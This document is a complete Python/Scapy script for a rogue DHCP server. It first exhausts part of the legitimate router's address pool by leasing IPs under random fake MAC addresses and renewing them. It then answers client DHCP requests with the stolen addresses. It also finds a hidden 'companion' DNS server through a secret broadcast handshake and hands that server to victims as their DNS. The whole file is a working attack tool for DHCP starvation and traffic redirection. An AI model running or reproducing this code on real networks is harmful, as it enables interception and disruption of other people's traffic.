import time
import random
import socket
import threading
import signal
import sys
from scapy.all import *

conf.checkIPaddr = False

DHCP_DISCOVER = 1
DHCP_OFFER = 2
DHCP_REQUEST = 3
DHCP_DECLINE = 4
DHCP_ACK = 5
DHCP_NAK = 6
DHCP_RELEASE = 7

LEASE_TIME = 3600             # 1 hour lease for my clients
RENEWAL_TIME = int(LEASE_TIME * 0.5)   # T1 Timer
REBINDING_TIME = int(LEASE_TIME * 0.875) # T2 Timer
PENDING_TIMEOUT = 10          # Seconds to hold an offer before reclaiming it

class PortableRogueDHCP:
    def __init__(self):
        self.iface = conf.iface
        self.server_mac = get_if_hwaddr(self.iface)
        self.server_ip = self.get_local_ip()
        self.running = True

        self.network_info = {}

        # --- State Management ---
        self.available_pool = []       # IPs we stole from router and are free to hand out
        self.stolen_leases = {}        # Tracking upstream leases with the real router
        self.pending_offers = {}       # {client_mac: {'ip': offered_ip, 'time': timestamp}}
        self.active_leases = {}        # {client_mac: {'ip': assigned_ip, 'expiry': timestamp}}

        print("\n[*] Initializing Portable Rogue DHCP Server...")
        print(f"    | Detected Interface:  {self.iface}")
        print(f"    | Detected Server MAC: {self.server_mac}")
        print(f"    | Detected Server IP:  {self.server_ip}\n")

        signal.signal(signal.SIGINT, self.signal_handler)

    def signal_handler(self, sig, frame):
        """Gracefully handle Ctrl+C."""
        print("\n\n[*] Shutdown signal received.")
        self.running = False
        self.release_stolen_ips()
        print("[*] Shutting down. Hope I was a good server!\n")
        sys.exit(0)

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return get_if_addr(conf.iface)

    def generate_mac(self):
        return str(RandMAC())

    def _get_padded_chaddr(self, mac_str):
        """Converts MAC string to 6 bytes and pads to 16 bytes for BOOTP chaddr."""
        mac_bytes = mac2str(mac_str)
        return mac_bytes + b'\x00' * 10

    def get_dhcp_options(self, packet):
        options = {}
        if packet.haslayer(DHCP):
            for opt in packet[DHCP].options:
                if isinstance(opt, tuple):
                    options[opt[0]] = opt[1]
        return options

    # ==========================================
    # PACKET BUILDER ABSTRACTIONS
    # ==========================================

    def _build_base_reply(self, client_mac_str, client_mac_bytes, xid, op=2):
        padded_chaddr = client_mac_bytes + b'\x00' * (16 - len(client_mac_bytes))
        eth = Ether(src=self.server_mac, dst=client_mac_str)
        ip = IP(src=self.server_ip, dst="255.255.255.255")
        udp = UDP(sport=67, dport=68)
        bootp = BOOTP(op=op, siaddr=self.server_ip, chaddr=padded_chaddr, xid=xid)
        return eth / ip / udp / bootp

    def build_offer(self, client_mac, client_mac_bytes, xid, offer_ip):
        base = self._build_base_reply(client_mac, client_mac_bytes, xid)
        base[BOOTP].yiaddr = offer_ip
        dhcp = DHCP(options=[
            ("message-type", DHCP_OFFER),
            ("subnet_mask", self.network_info['subnet_mask']),
            ("router", self.network_info['gateway']),
            ("name_server", self.network_info['dns']),
            ("lease_time", LEASE_TIME),
            ("renewal_time", RENEWAL_TIME),
            ("rebinding_time", REBINDING_TIME),
            ("server_id", self.server_ip),
            "end"
        ])
        return base / dhcp

    def build_ack(self, client_mac, client_mac_bytes, xid, assigned_ip):
        base = self._build_base_reply(client_mac, client_mac_bytes, xid)
        base[BOOTP].yiaddr = assigned_ip
        dhcp = DHCP(options=[
            ("message-type", DHCP_ACK),
            ("subnet_mask", self.network_info['subnet_mask']),
            ("router", self.network_info['gateway']),
            ("name_server", self.network_info['dns']),
            ("lease_time", LEASE_TIME),
            ("renewal_time", RENEWAL_TIME),
            ("rebinding_time", REBINDING_TIME),
            ("server_id", self.server_ip),
            "end"
        ])
        return base / dhcp

    def build_nak(self, client_mac, client_mac_bytes, xid):
        base = self._build_base_reply(client_mac, client_mac_bytes, xid)
        base[BOOTP].yiaddr = "0.0.0.0"
        dhcp = DHCP(options=[
            ("message-type", DHCP_NAK),
            ("server_id", self.server_ip),
            "end"
        ])
        return base / dhcp

    def build_heist_request(self, mac_str, mac_bytes, xid, requested_ip=None, msg_type=DHCP_DISCOVER):
        padded_chaddr = mac_bytes + b'\x00' * (16 - len(mac_bytes))

        eth = Ether(src=mac_str, dst="ff:ff:ff:ff:ff:ff")
        ip = IP(src="0.0.0.0", dst="255.255.255.255")
        udp = UDP(sport=68, dport=67)
        bootp = BOOTP(chaddr=padded_chaddr, xid=xid)
        opts = [("message-type", msg_type)]
        if requested_ip:
            opts.extend([
                ("server_id", self.network_info['real_dhcp_ip']),
                ("requested_addr", requested_ip)
            ])
        opts.append("end")

        return eth / ip / udp / bootp / DHCP(options=opts)

    # ==========================================
    # --- PHASES OF OPERATION ---
    # ==========================================

    def phase_1_recon(self):
        print("[*] PHASE 1: DHCP Network Reconnaissance")
        probe_mac_str = self.generate_mac()
        probe_mac_bytes = mac2str(probe_mac_str)
        probe_packet = self.build_heist_request(probe_mac_str, probe_mac_bytes, random.randint(1, 900000000))

        ans = srp1(probe_packet, iface=self.iface, timeout=5, verbose=False)

        if ans and ans.haslayer(DHCP):
            opts = self.get_dhcp_options(ans)
            self.network_info['gateway'] = opts.get('router', 'Unknown')
            self.network_info['subnet_mask'] = opts.get('subnet_mask', '255.255.255.0')
            self.network_info['dns'] = opts.get('name_server', '8.8.8.8')
            self.network_info['real_dhcp_ip'] = opts.get('server_id', 'Unknown')

            print(f"    [+] Blueprint Extracted:")
            print(f"        -> Gateway:      {self.network_info['gateway']}")
            print(f"        -> Subnet Mask:  {self.network_info['subnet_mask']}")
            print(f"        -> DNS Server:   {self.network_info['dns']}")
            print(f"        -> Real DHCP:    {self.network_info['real_dhcp_ip']}\n")
            return True
        return False

    def phase_1_5_companion_discovery(self):
        print("[*] PHASE 1.5: The Marco Polo DNS Companion Discovery")
        discovery_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        discovery_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        discovery_socket.settimeout(2.0)

        secret_msg = b"IM_A_BARBIE_GIRL_IN_A_BARBIE_WORLD"
        expected_reply = b"COME_ON_BARBIE_LETS_GO_PARTY"

        found = False
        for attempt in range(1, 4):
            print(f"    [~] Attempting to find DNS companion, pulse {attempt}/3 on port 9999...")
            try:
                discovery_socket.sendto(secret_msg, ('255.255.255.255', 9999))
                data, addr = discovery_socket.recvfrom(1024)
                if data == expected_reply:
                    print(f"    [+] Companion DNS found at {addr[0]}! Updating network info.")
                    self.network_info['dns'] = addr[0]
                    found = True
                    break
            except socket.timeout:
                continue
            except Exception as e:
                print(f"    [-] Socket error during discovery: {e}")

        if not found:
            print("    [-] No companion found. Falling back to default router DNS.")

        discovery_socket.close()
        print("")

    def phase_2_heist(self, count=10):
        print(f"[*] PHASE 2: IP Heist (Attempting to steal {count} IPs)")
        for i in range(count):
            mac_str = self.generate_mac()
            mac_bytes = mac2str(mac_str)
            xid = random.randint(1, 900000000)

            discover_pkt = self.build_heist_request(mac_str, mac_bytes, xid)
            ans = srp1(discover_pkt, iface=self.iface, timeout=2, verbose=False)

            if ans and ans.haslayer(DHCP):
                offered_ip = ans[BOOTP].yiaddr
                lease_time = self.get_dhcp_options(ans).get('lease_time', 3600)

                request_pkt = self.build_heist_request(mac_str, mac_bytes, xid, requested_ip=offered_ip, msg_type=DHCP_REQUEST)
                sendp(request_pkt, iface=self.iface, verbose=False)

                self.available_pool.append(offered_ip)
                self.stolen_leases[offered_ip] = {
                    'mac_str': mac_str,
                    'mac_bytes': mac_bytes,
                    'lease_time': lease_time,
                    'last_renew': time.time()
                }
                print(f"    [+] Hoarded: {offered_ip:<15} (Fake MAC: {mac_str})")
            else:
                print(f"    [-] Timeout waiting for offer (Router ignored or rate-limited request).")
            time.sleep(0.2)

        print(f"\n    [=] Total IPs successfully secured: {len(self.available_pool)}\n")

    def release_stolen_ips(self):
        """Releases the hoarded IPs back to the legitimate router."""
        print("\n[*] Commencing stolen IP release sequence...")
        if not self.stolen_leases:
            print("    [-] No stolen IPs to release.")
            return

        for ip, lease_data in self.stolen_leases.items():
            mac_str = lease_data['mac_str']
            mac_bytes = lease_data['mac_bytes']
            padded_chaddr = mac_bytes + b'\x00' * 10

            # Build standard DHCP Release
            eth = Ether(src=mac_str, dst="ff:ff:ff:ff:ff:ff")
            ip_pkt = IP(src=ip, dst=self.network_info['real_dhcp_ip'])
            udp = UDP(sport=68, dport=67)
            bootp = BOOTP(ciaddr=ip, chaddr=padded_chaddr, xid=random.randint(1, 900000000))

            dhcp_release = DHCP(options=[
                ("message-type", DHCP_RELEASE),
                ("server_id", self.network_info['real_dhcp_ip']),
                "end"
            ])

            release_packet = eth / ip_pkt / udp / bootp / dhcp_release
            sendp(release_packet, iface=self.iface, verbose=False)
            print(f"    [+] Released IP {ip} (Fake MAC: {mac_str})")

        print("[*] All hoarded IPs returned to the upstream router.")

    def background_state_manager(self):
        print("    [~] Background State Manager Daemon started.")
        while self.running:
            time.sleep(5)
            current_time = time.time()

            # 1. Renew Upstream Leases
            for ip, lease_data in self.stolen_leases.items():
                if (current_time - lease_data['last_renew']) >= (lease_data['lease_time'] / 2):
                    padded_chaddr = lease_data['mac_bytes'] + b'\x00' * 10
                    eth = Ether(src=lease_data['mac_str'], dst="ff:ff:ff:ff:ff:ff")
                    ip_pkt = IP(src="0.0.0.0", dst="255.255.255.255")
                    udp = UDP(sport=68, dport=67)
                    bootp = BOOTP(ciaddr=ip, chaddr=padded_chaddr, xid=random.randint(1, 900000000))
                    dhcp_req = DHCP(options=[("message-type", DHCP_REQUEST), ("server_id", self.network_info['real_dhcp_ip']), ("requested_addr", ip), "end"])
                    sendp(eth / ip_pkt / udp / bootp / dhcp_req, iface=self.iface, verbose=False)
                    lease_data['last_renew'] = current_time

            # 2. Cleanup Stale Pending Offers
            stale_macs = []
            for mac, data in self.pending_offers.items():
                if current_time - data['time'] > PENDING_TIMEOUT:
                    self.available_pool.append(data['ip'])
                    stale_macs.append(mac)
                    print(f"\n    [!] Offer to {mac} expired. Reclaimed {data['ip']} to pool.")
            for mac in stale_macs:
                del self.pending_offers[mac]

            # 3. Cleanup Expired Active Leases
            expired_macs = []
            for mac, data in self.active_leases.items():
                if current_time > data['expiry']:
                    self.available_pool.append(data['ip'])
                    expired_macs.append(mac)
                    print(f"\n    [!] Active lease for {mac} expired. Reclaimed {data['ip']} to pool.")
            for mac in expired_macs:
                del self.active_leases[mac]

    def phase_3_serve(self, packet):
        if not packet.haslayer(DHCP): return

        opts = self.get_dhcp_options(packet)
        msg_type = opts.get('message-type')
        client_mac = packet[Ether].src
        client_mac_bytes = packet[BOOTP].chaddr
        xid = packet[BOOTP].xid

        if client_mac == self.server_mac: return

        # --- DORA: Handle DISCOVER ---
        if msg_type == DHCP_DISCOVER:
            print(f"\n[?] [DISCOVER] received from {client_mac} (XID: {xid})")

            if client_mac in self.active_leases:
                offer_ip = self.active_leases[client_mac]['ip']
                print(f"    -> Known client. Re-offering active IP {offer_ip}")
            elif client_mac in self.pending_offers:
                offer_ip = self.pending_offers[client_mac]['ip']
                self.pending_offers[client_mac]['time'] = time.time()
                print(f"    -> Known client. Refreshing pending IP {offer_ip}")
            elif self.available_pool:
                offer_ip = self.available_pool.pop(0)
                self.pending_offers[client_mac] = {'ip': offer_ip, 'time': time.time()}
                print(f"    -> [OFFER] New client. Offering pool IP {offer_ip}")
            else:
                print(f"    [-] Pool exhausted. Cannot service {client_mac}.")
                return

            offer_pkt = self.build_offer(client_mac, client_mac_bytes[:6], xid, offer_ip)
            sendp(offer_pkt, iface=self.iface, verbose=False)

        # --- DORA: Handle REQUEST ---
        elif msg_type == DHCP_REQUEST:
            requested_server_id = opts.get('server_id')
            req_ip = opts.get('requested_addr')
            if not req_ip: req_ip = packet[BOOTP].ciaddr

            print(f"\n[?] [REQUEST] received from {client_mac} for {req_ip} (Target Server: {requested_server_id})")

            # VALIDATION 1: Is this request meant for my server?
            if requested_server_id == self.server_ip or requested_server_id is None:
                is_valid = False

                # VALIDATION 2 & 3: Pending or Active
                if client_mac in self.pending_offers and self.pending_offers[client_mac]['ip'] == req_ip:
                    is_valid = True
                    del self.pending_offers[client_mac]
                elif client_mac in self.active_leases and self.active_leases[client_mac]['ip'] == req_ip:
                    is_valid = True

                if is_valid:
                    print(f"    [+] [ACK] Request validated! Assigning {req_ip} to {client_mac} :)")
                    self.active_leases[client_mac] = {
                        'ip': req_ip,
                        'expiry': time.time() + LEASE_TIME
                    }
                    ack_pkt = self.build_ack(client_mac, client_mac_bytes[:6], xid, req_ip)
                    sendp(ack_pkt, iface=self.iface, verbose=False)
                else:
                    print(f"    [-] NAK: Invalid request from {client_mac} for {req_ip}. Sending NAK.")
                    nak_pkt = self.build_nak(client_mac, client_mac_bytes[:6], xid)
                    sendp(nak_pkt, iface=self.iface, verbose=False)

            # Client requested an IP from another server (race condition lost)
            elif requested_server_id and requested_server_id != self.server_ip:
                print(f"    [!] Client chose competing server {requested_server_id} :(")
                if client_mac in self.pending_offers:
                    reclaimed_ip = self.pending_offers.pop(client_mac)['ip']
                    self.available_pool.append(reclaimed_ip)
                    print(f"    [*] Reclaimed {reclaimed_ip} back to available address pool.")

        # --- DORA: RELEASE ---
        elif msg_type == DHCP_RELEASE:
            if client_mac in self.active_leases:
                released_ip = self.active_leases.pop(client_mac)['ip']
                self.available_pool.append(released_ip)
                print(f"\n[-] RELEASE: Client {client_mac} released {released_ip}. Returned to pool.")

    def start(self):
        # PHASE 1: Recon
        if not self.phase_1_recon():
            print("\n[!] DHCP lease could not be obtained, please relaunch\n")
            return

        # PHASE 1.5: Companion discovery
        self.phase_1_5_companion_discovery()

        # PHASE 2: Heist
        self.phase_2_heist(count=10)
        if not self.stolen_leases:
            print("\n[!] DHCP lease could not be obtained, please relaunch\n")
            return

        # PHASE 3: Serve
        threading.Thread(target=self.background_state_manager, daemon=True).start()
        print("[*] PHASE 3: ROUGE SERVER LIVE. Listening for clients... (Press Ctrl+C to stop)\n")

        sniff(filter="udp and (port 67 or 68)",
            prn=self.phase_3_serve,
            stop_filter=lambda x: not self.running,
            store=0,
            iface=self.iface)

if __name__ == "__main__":
    server = PortableRogueDHCP()
    server.start()
